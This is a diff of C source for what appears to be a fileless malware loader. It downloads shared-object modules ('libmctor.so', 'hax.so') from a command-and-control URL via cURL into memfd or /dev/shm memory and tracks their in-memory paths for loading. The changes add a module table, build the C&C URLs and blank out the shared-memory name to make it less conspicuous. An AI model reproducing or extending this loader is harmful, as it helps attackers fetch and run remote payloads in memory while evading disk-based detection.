@@ -18,7 +18,7 @@
 #include "zaf.h"
 
 
-#define SHM_NAME "DragonSlayer"
+#define SHM_NAME " "
 #define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html
 
 
@@ -104,6 +104,7 @@ int download_to_RAM(char *download) {
     Shared_Mem_Fd shm_fd_s = {0};
     shm_fd_s.shm_fd=shm_fd;
 
+	printf("[+] URL for cURL: %s\n", download);
 
     curl_global_init(CURL_GLOBAL_DEFAULT);    
 	// We use cURL to download the file
@@ -123,7 +124,7 @@ int download_to_RAM(char *download) {
 		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
 			fprintf(stderr, "[-] cURL failed: %s\n", curl_easy_strerror(res));
 			close(shm_fd);
-			exit(-1);
+            shm_fd=0;
 		}
 		curl_easy_cleanup(curl);
 		return shm_fd;
@@ -152,12 +153,12 @@ void load_so(int shm_fd) {
 }
 
 // Get memfd location 
-int setMemfd(int shm_fd) {
+int createMemfdTbl(int shm_fd, char* mname) {
     char path[1024];
     void *handle;
     
 
-    printf("[+] Trying to load Shared Object!\n");
+    printf("[+] Creating Index Table\n");
     if (kernel_version() == 1) { //Funky way
         printf("[.] yay, memfd supported.\n");
         snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
@@ -166,36 +167,40 @@ int setMemfd(int shm_fd) {
         snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
         printf("[.] hmm, only shm supported.\n");
     }
-    if ( check_empty(head) == 0 ) { // list is empty
-        printf("[.] List empty.\n");
+    if (check_empty(head) == 0) {
+        printf("[.] Head empty\n");
         head = malloc(sizeof(node_t));
         if (head == NULL) {
+		    fprintf(stderr,"[-] malloc() failed\n");
             return 1;
         }
-        printf("[.] Adding node_t entry.\n");
-        push_first(head, path);
+        push_first(head, path, mname);
     }else{
-        push(head, path);
+        push(head, path, mname);
     }
-    printf("Path: %s\n", path);
 }
 
 
 int main (int argc, char **argv) {
-    char *urls[2] = {"http://localhost:8080/libmctor.so", "http://localhost:8080/libmctor.so"};
+    char *modules[2] = {"libmctor.so", "hax.so"};
+    char *ccurl="http://127.0.0.1:8080/";
+    char urlbuf[255];
 	int fd;
     int i;
 
 	printf("[+] Trying to reach C&C & start download...\n");
     for(i = 0; i < 2; i++)
     {
-        printf("URL = %s \n", urls[i]);
-        fd = download_to_RAM(urls[i]);
-        setMemfd(fd);
+        snprintf(urlbuf, sizeof(urlbuf), "%s%s", ccurl, modules[i]);
+        printf("URL = %s \n", urlbuf);
+        fd = download_to_RAM(urlbuf);
+        if (fd != 0){
+            createMemfdTbl(fd, modules[i]);
+        }
 
-        print_list(head);
     }
 
+    print_list(head);
 
     //load_so(fd, fd_s);
 
@@ -205,7 +210,6 @@ int main (int argc, char **argv) {
 
 int check_empty(node_t * head){
     int empty  = (head == NULL) ? 0 : 1;
-    //printf("Head is %d\n", empty);
     return empty;
 }
 
@@ -213,43 +217,41 @@ void print_list(node_t * head) {
     node_t * current = head;
     int c = 1;
 
+    printf("\n=== \n");
     while (current != NULL) {
-        printf("%d: (%d) %s\n", c, strlen(current->mpath), current->mpath);
+        printf("%d: %s - %s\n", c, current->mname, current->mpath);
         current = current->next;
         c++;
     }
 }
 
-int push_first(node_t * head, char* path) {
+int push_first(node_t * head, char* path, char* mname) {
 
-    if (head == NULL) {
-        return 1;
-    }
-
-    //printf("[.] Adding path: %s, strlen(path): %d\n", path, strlen(path));
+    printf("[.] Adding path: %s, strlen(path): %d name: %s strlen(name): %d\n", path, strlen(path), mname, strlen(mname));
     strncpy(head->mpath, path, strlen(path));
+    strncpy(head->mname, mname, strlen(mname));
     head->next = NULL;
-    //printf("[.] List : mpath:%s:next: %d\n", head->mpath, head->next);
-    print_list(head);
-
-    return 0;
+    printf("[.] %s : %s\n", head->mname, head->mpath);
 }
 
-int push(node_t * head, char* path) {
+int push(node_t * head, char* path, char* mname) {
     node_t * current = head;
+
+    printf("[.] Adding path: %s, strlen(path): %d name: %s strlen(name): %d\n", path, strlen(path), mname, strlen(mname));
+
 
     while (current->next != NULL) {
         current = current->next;
     }
 
-    //printf("[.] Adding path: %s, strlen(path): %d\n", path, strlen(path));
     current->next = malloc(sizeof(node_t));
     if (current == NULL) {
         return 1;
     }
 
     strncpy(current->next->mpath, path, strlen(path));
+    strncpy(current->next->mname, mname, strlen(mname));
     current->next->next = NULL;
-
+    printf("[.] %s : %s\n", current->mname, current->mpath);
 }
 
